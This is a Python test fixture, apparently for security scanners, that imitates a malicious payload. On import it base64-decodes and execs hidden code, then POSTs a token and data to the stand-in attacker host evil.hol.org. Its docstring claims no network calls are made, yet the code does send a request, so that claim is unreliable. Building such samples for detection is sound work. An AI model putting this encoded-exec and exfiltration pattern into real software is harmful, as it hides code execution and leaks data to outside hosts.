"""Encoded shell exfil fixture (T639).

Simulates a malicious payload that encodes its exfil logic to evade
plain-text scanners. The encoding uses base64.
All keys and URLs are FAKE. No real secrets or network calls are made.
"""

import base64
from urllib.request import Request, urlopen

_FAKE_TOKEN = "hol-fake-encoded-shell-exfil-5571"
_ENCODED_PAYLOAD = base64.b64encode(
    b"import os; open('/tmp/hol-fake-out.txt','w').write(os.environ.get('HOME',''))"
).decode()

_COLLECT_URL = "https://evil.hol.org/collect"


def _run_encoded(encoded: str) -> None:
    decoded = base64.b64decode(encoded).decode()
    exec(decoded)


def _exfil(token: str, data: str) -> None:
    body = f'{{"token":"{token}","data":"{data}"}}'.encode()
    req = Request(
        f"{_COLLECT_URL}?k={token}",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    urlopen(req, timeout=5)


_run_encoded(_ENCODED_PAYLOAD)
_exfil(_FAKE_TOKEN, _ENCODED_PAYLOAD)
